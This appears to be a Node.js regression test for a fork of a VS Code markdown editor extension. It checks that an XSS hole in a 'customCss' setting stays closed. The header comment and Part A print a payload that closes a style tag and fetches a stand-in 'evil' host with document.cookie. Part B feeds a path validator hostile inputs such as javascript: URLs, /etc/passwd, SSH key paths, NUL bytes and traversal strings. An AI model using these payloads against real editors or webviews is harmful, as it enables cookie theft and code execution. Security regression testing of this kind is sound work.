#!/usr/bin/env node
/**
 * PoC H3 — XSS via raw HTML in `customCss` setting
 *
 * Threat model (PRE-FORK):
 *   User had upstream `zaaack.markdown-editor` installed. User cloned an
 *   untrusted repo. The repo's `.vscode/settings.json` contained:
 *     {
 *       "markdown-editor.customCss": "</style><script>fetch('https://evil/'+document.cookie)</script>"
 *     }
 *   On opening any .md in the workspace, the extension built the webview
 *   HTML by string-concatenating that value into a `<style>` block:
 *     <style>${EditorPanel.config.get('customCss')}</style>
 *   The `</style>` in the hostile value closed the style tag, then the
 *   injected `<script>` ran in the webview context. With `enableScripts:true`
 *   (set by upstream) and no CSP, this was XSS. With `enableCommandUris:true`
 *   (closed by C1.2), this was RCE.
 *
 * Fork redesign (C1.4 / DC2):
 *   The setting is renamed to `customStylesheet` and reinterpreted as a
 *   WORKSPACE-RELATIVE PATH to a `.css` file. `resolveCustomStylesheet`
 *   delegates validation to `validateWorkspaceRelativePath` which rejects
 *   non-string, empty, URL-shaped, absolute, traversing, NUL-byte, and
 *   wrong-extension inputs. Result is emitted as `<link rel="stylesheet">`
 *   (resource URL via webview.asWebviewUri), NOT a content-interpolated
 *   `<style>` block.
 *
 * Verified in fork by:
 *   - Part A (vulnerability shape demo): construct the original upstream
 *     pattern (string interpolated into <style>) and show how it would
 *     have escaped the tag. Documentation only — not a fork-state check.
 *   - Part B (fork fix property — validator rejects hostile inputs):
 *     drive `validateWorkspaceRelativePath` with a corpus of hostile
 *     inputs, assert each is rejected with the expected reason.
 *   - Part C (fork fix property — source-level): grep src/extension.ts
 *     to verify (a) no active `customCss` read remains, (b) no
 *     `<style>${...}</style>` interpolation pattern remains.
 */

const path = require('path');
const fs = require('fs');

// Register ts-node so we can require the .ts source directly.
require('ts-node').register({
  transpileOnly: true,
  compilerOptions: {
    module: 'commonjs',
    target: 'es2019',
    esModuleInterop: true,
    strict: false,
  },
});

const PATH_VALIDATION = path.join(__dirname, '..', '..', 'src', 'security', 'path-validation.ts');
const EXTENSION_TS = path.join(__dirname, '..', '..', 'src', 'extension.ts');

const { validateWorkspaceRelativePath } = require(PATH_VALIDATION);

function partA_vulnerabilityShapeDemo() {
  console.log('\n[poc-h3 part A] vulnerability shape — upstream pattern (DOCUMENTATION ONLY)');
  console.log('  Upstream interpolated the customCss value directly into a <style> tag:');
  console.log("    <style>${EditorPanel.config.get('customCss')}</style>");
  console.log('  If the value was:');
  console.log("    </style><script>fetch('https://evil/'+document.cookie)</script>");
  console.log('  the resulting HTML would have been:');
  console.log('    <style></style><script>fetch(...)</script>');
  console.log('  → the <style> tag closes early, then the injected <script> runs in the webview.');
  console.log('  This is the H3 vector that C1.4 closed.');
  console.log('  (No assertion — Part B + Part C are the regression gates.)');
  return { status: 'documented', critical: false };
}

function partB_validatorRejectsHostileInputs() {
  console.log('\n[poc-h3 part B] fork fix property — validateWorkspaceRelativePath rejects hostile inputs');

  const WS_ROOT = '/home/user/workspace';
  const REQUIRED_EXT = '.css';

  const cases = [
    // The original attack payload — not even a path, just HTML.
    { input: "</style><script>alert(1)</script>", expectedReason: 'wrong-extension' },
    // URL-shaped values (any scheme).
    { input: 'data:text/css,body{display:none}',  expectedReason: 'url-scheme' },
    { input: 'javascript:alert(1)',               expectedReason: 'url-scheme' },
    { input: 'https://evil.example/style.css',    expectedReason: 'url-scheme' },
    { input: 'file:///etc/passwd',                expectedReason: 'url-scheme' },
    { input: 'ftp://evil/style.css',              expectedReason: 'url-scheme' },
    { input: 'vscode://settings',                 expectedReason: 'url-scheme' },
    // Protocol-relative.
    { input: '//evil.example/style.css',          expectedReason: 'protocol-relative' },
    // Absolute paths.
    { input: '/etc/passwd',                       expectedReason: 'absolute-posix' },
    { input: '/Users/victim/.ssh/id_rsa',         expectedReason: 'absolute-posix' },
    { input: 'C:\\Users\\victim\\style.css',      expectedReason: 'absolute-windows' },
    { input: 'C:/Users/victim/style.css',         expectedReason: 'absolute-windows' },
    // Wrong extension.
    { input: 'malicious.html',                    expectedReason: 'wrong-extension' },
    { input: 'malicious.js',                      expectedReason: 'wrong-extension' },
    { input: 'no-extension',                      expectedReason: 'wrong-extension' },
    { input: '',                                  expectedReason: 'empty' },
    // NUL byte (defeats C-string truncation tricks). NUL check runs first.
    { input: 'style.css\0.html',                  expectedReason: 'nul-byte' },
    { input: 'safe.css\0',                        expectedReason: 'nul-byte' },
    // Type-confusion.
    { input: null,                                expectedReason: 'not-string' },
    { input: undefined,                           expectedReason: 'not-string' },
    { input: 42,                                  expectedReason: 'not-string' },
    { input: ['style.css'],                       expectedReason: 'not-string' },
    { input: { toString: () => 'style.css' },     expectedReason: 'not-string' },
    // Workspace escape via `..`.
    { input: '../escape.css',                     expectedReason: 'escapes-workspace' },
    { input: '../../etc/passwd-also-not-css',     expectedReason: 'wrong-extension' },
    { input: '../../etc/anything.css',            expectedReason: 'escapes-workspace' },
    { input: 'subdir/../../../etc/x.css',         expectedReason: 'escapes-workspace' },
  ];

  let failures = 0;
  for (const { input, expectedReason } of cases) {
    const result = validateWorkspaceRelativePath(input, WS_ROOT, REQUIRED_EXT);
    const got = result.ok ? 'OK' : result.reason;
    const ok = !result.ok && result.reason === expectedReason;
    const tag = ok ? '✓' : '✗';
    const displayInput = typeof input === 'string'
      ? JSON.stringify(input)
      : String(input);
    console.log(`  ${tag} input=${displayInput.length > 55 ? displayInput.slice(0, 52) + '..."' : displayInput.padEnd(55)} want=${expectedReason.padEnd(20)} got=${got}`);
    if (!ok) failures++;
  }

  // ALSO test that valid inputs are accepted.
  const validCases = [
    'style.css',
    'styles/editor.css',
    './styles/editor.css',
    '.vscode/markdown-editor.css',
    'a/b/c/d/e.css',
    'UPPERCASE.CSS', // case-insensitive extension
  ];
  console.log('\n  --- valid inputs (must be accepted) ---');
  for (const input of validCases) {
    const result = validateWorkspaceRelativePath(input, WS_ROOT, REQUIRED_EXT);
    const tag = result.ok ? '✓' : '✗';
    const detail = result.ok ? `→ ${result.resolved}` : `rejected: ${result.reason}`;
    console.log(`  ${tag} input=${JSON.stringify(input).padEnd(40)} ${detail}`);
    if (!result.ok) failures++;
  }

  if (failures > 0) {
    console.log(`\n[poc-h3 part B] FAIL — ${failures} case(s) gave the wrong verdict`);
    return { status: 'validator-broken', critical: true };
  }
  console.log('\n[poc-h3 part B] PASS — validator handles all hostile + valid inputs correctly');
  return { status: 'validator-correct', critical: false };
}

function partC_sourceLevelProperties() {
  console.log('\n[poc-h3 part C] fork fix property — source-level absence of upstream pattern');
  if (!fs.existsSync(EXTENSION_TS)) {
    throw new Error(`extension.ts not found at ${EXTENSION_TS}`);
  }
  const source = fs.readFileSync(EXTENSION_TS, 'utf8');
  const stripped = source
    .replace(/\/\/.*$/gm, '')
    .replace(/\/\*[\s\S]*?\*\//g, '');

  const checks = [
    {
      name: 'no active customCss config-read',
      pass: !/config\.get\s*[<(].*customCss/.test(stripped),
    },
    {
      name: 'no <style>${...}</style> interpolation in templates',
      // Match <style> followed by ${ within ~200 chars (to catch multi-line
      // template-literal interpolations) and then </style>.
      pass: !/<style>[^<]*\$\{[^]*?<\/style>/.test(stripped),
    },
    {
      name: 'customStylesheet config-read is present (positive check)',
      pass: /config\.get\s*[<(].*customStylesheet/.test(stripped),
    },
    {
      name: 'resolveCustomStylesheet delegates to validateWorkspaceRelativePath',
      pass: /validateWorkspaceRelativePath\s*\(/.test(stripped),
    },
  ];

  let failures = 0;
  for (const c of checks) {
    const tag = c.pass ? '✓' : '✗';
    console.log(`  ${tag} ${c.name}`);
    if (!c.pass) failures++;
  }

  if (failures > 0) {
    return { status: 'source-regressed', critical: true };
  }
  return { status: 'source-property-holds', critical: false };
}

(async () => {
  let exitCode = 0;
  try {
    const partA = partA_vulnerabilityShapeDemo();
    const partB = partB_validatorRejectsHostileInputs();
    const partC = partC_sourceLevelProperties();

    console.log('\n[poc-h3] summary:');
    console.log(`  part A: ${partA.status}`);
    console.log(`  part B: ${partB.status}${partB.critical ? ' (CRITICAL)' : ''}`);
    console.log(`  part C: ${partC.status}${partC.critical ? ' (CRITICAL)' : ''}`);

    if (partB.critical || partC.critical) exitCode = 1;
    if (exitCode === 0) {
      console.log('\n[poc-h3] OVERALL: PASS — H3 customCss XSS vector closed');
    } else {
      console.log('\n[poc-h3] OVERALL: FAIL');
    }
  } catch (e) {
    console.error(`\n[poc-h3] ERROR: ${e.message}`);
    console.error(e.stack);
    exitCode = 2;
  }
  process.exit(exitCode);
})();
